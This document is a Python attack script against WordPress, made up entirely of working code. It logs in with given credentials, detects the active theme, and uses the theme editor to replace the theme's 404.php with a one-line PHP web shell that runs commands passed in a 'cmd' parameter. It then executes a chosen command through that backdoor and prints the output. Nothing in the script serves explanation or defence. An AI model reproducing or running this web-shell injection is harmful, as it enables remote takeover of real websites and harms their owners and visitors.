#!/usr/bin/python3

import requests
import sys
import argparse
import re
from urllib3.exceptions import InsecureRequestWarning
# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def login(url, user, password):
    checkurl = re.search("/wp-login.php", url)
    if checkurl is None:
        if url[-1] != "/": url = url + "/"
        url = url + "wp-login.php"
    print("[+] Checking connectivity")
    # r = requests.get(url, verify=False, allow_redirects=False)
    try:
        r = requests.get(url, verify=False, allow_redirects=False)
        print('[+] URL is accessible')
        cookies = r.cookies.get_dict()
        data = {"log": user, "pwd": password, "wp-submit": "Log In", "redirect_to": f"{url}/wp-admin/", "testcookie": "1"}
        r = requests.post(url, cookies=cookies, data=data, verify=False, allow_redirects=False)
        if r.status_code != 302:
            print("[+] Incorrect username and/or password!")
        else:
            print("[+] Login successful")
            return r.cookies.get_dict()
    except requests.exceptions.ConnectionError:
        print("[+] Error accessing provided URL!")
        sys.exit()
    except KeyboardInterrupt:
        sys.exit()
        
def getTheme(url, cookies):
    if url[-1] != "/": url = url + "/"
    url = url + "wp-admin/themes.php"
    # print(url)
    print('[+] Checking active WordPress theme')
    r = requests.get(url, verify=False, cookies=cookies, allow_redirects=False)
    check = re.search('<div class="theme active" tabindex="0" aria-describedby="(.*?)-action (.*?)-name">', r.text)
    if check is not None:
        theme = check.group(1)
        print(f"[+] Active theme: {theme}")
        return theme
    else:
        print("[+] Error getting active theme!")
        sys.exit()

def codeInject(url, cookies, theme):
    if url[-1] != "/": url = url + "/"
    url_wpnonce = url + f"/wp-admin/theme-editor.php?file=404.php&theme={theme}"
    r = requests.get(url_wpnonce, cookies=cookies, verify=False, allow_redirects=False)
    # change this based on response output
    # print(r.text)
    check = re.search('<input type="hidden" id="_wpnonce" name="_wpnonce" value="(.*?)" />', r.text)
    # print(check)
    if check is not None:
        wpnonce = check.group(1)
        # if PHP system() is not working, change to shell_exec()
        data = {"_wpnonce": wpnonce, "_wp_http_referer": f"/wp-admin/theme-editor.php?file=404.php&theme={theme}&scrollto=0&updated=true", "newcontent": "<?php system($_GET['cmd']); ?>", "action": "update", "file": "404.php", "theme": theme, "scrollto": "0", "docs-list": "", "submit": "Update File"}
        url_editor = url + "/wp-admin/theme-editor.php"
        r = requests.post(url_editor, cookies=cookies, data=data, verify=False, allow_redirects=False)
        if r.status_code != 302:
            print(f"[+] Error editing 404.php of {theme} theme!")
            sys.exit()
        else:
            print("[+] 404.php edited with our PHP code")
            backdoor = url + f"wp-content/themes/{theme}/404.php"
            print(f"[+] Backdoor is accessible via {backdoor}?cmd=id")
            return backdoor
    else:
        print("[+] Error accessing WordPress theme editor!")
        sys.exit()
        
def rce(backdoor, command):
    url = backdoor + f"?cmd={command}"
    r = requests.get(url, verify=False, allow_redirects=False)
    if r.status_code != 200:
        print("[+] Error accessing backdoor!")
    else:
        print(f"[+] Executing command: {command}\n[+] Output:\n\n{r.text}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="WordPress Theme Code Injection")
    parser.add_argument("-u", "--url", help="Target URL (Ex: http://test.com/wordpress/)")
    parser.add_argument("-x", "--command", help="Command to execute")
    parser.add_argument("--user", help="WordPress username")
    parser.add_argument("--password", help="WordPress password")
    args = parser.parse_args()
    url = args.url
    command = args.command
    user = args.user
    password = args.password
    if len(sys.argv) < 2:
        print("[+] Arguments required! Please use -h for more details.")
    else:
        if url and command and user and password is not None:
            cookies = login(url, user, password)
            # print(cookies)
            theme = getTheme(url, cookies)
            # print(theme)
            backdoor = codeInject(url, cookies, theme)
            rce(backdoor, command)
        else:
            print("[+] Missing arguments!")
        